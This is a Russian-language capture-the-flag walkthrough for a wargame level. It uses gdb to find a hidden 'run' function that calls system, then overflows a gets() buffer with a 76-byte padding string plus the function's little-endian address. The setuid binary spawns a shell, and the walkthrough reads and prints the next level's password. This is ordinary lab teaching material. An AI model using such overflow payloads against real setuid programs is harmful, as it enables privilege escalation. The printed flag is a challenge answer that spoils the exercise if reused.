На этом уровне так же пользуемся gdb:
info functions (эта команда возвращает нам список всех функций):
0x08048340  gets
0x08048350  fwrite
0x08048360  system
0x08048444  run
0x08048480  main

Дисассемблируем функцию main (disass main):
   0x08048490 <+16>:	call   0x8048340 <gets@plt>     считывает строку из stdin и записывает ее в буфер,
                                                        на который указывает s, пока не встретится символ новой строки или EOF.
                                                        Проверка на переполнение буфера не производится


Больше никаких вызовов функций в main не происходит, что странно, потому что мы знаем что есть и другие функции, делаем disass run:

   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>   выводит строку "Good... Wait what?"
   0x08048479 <+53>:	call   0x8048360 <system@plt>   выполняет команды, указанные в string, вызывая в свою очередь команду /bin/sh -c string.


Можно вызвать функцию run в gdb через команду jump.
> jump run
Continuing at 0x804844a.
Good... Wait what?
$ > id
uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)
Но это нам ничего не даст, потому что таким образом мы будем с правами доступа юзера level1, а не level2.


Что мы знаем о функции gets: проверка на переполнение буфера не производится. Это значит что мы можем прочитать из консоли больше информации,
чем для этого выделено места в буфере.

> ./level1
111111111122222222223333333333444444444455555555556666666666777777777788888
> ./level1
11111111112222222222333333333344444444445555555555666666666677777777778888888
Segmentation fault (core dumped)
> ./level1
1111111111222222222233333333334444444444555555555566666666667777777777888888
Illegal instruction (core dumped)

Читаем про переполнение буфера gets.
Нам нужна строка заполненная какой-то информацией на 76 символов и аддресс функции run в little endian формате.
Чтобы узнать какой порядок байтов на машине используем программу: lscpu | grep Endian
Byte Order:            Little Endian

То есть адресс функции run = 0x08048444, но мы его записываем как \x44\x84\x04\x08. (В обратном порядке и учитываем 16ю систему записи)

> echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/lev1
или то же самое при помощи perl:
> perl -e 'print "a"x76 ."\x44\x84\x04\x08"' > /tmp/lev1


> cat /tmp/lev1 - | ./level1
Good... Wait what?
> id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
> cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77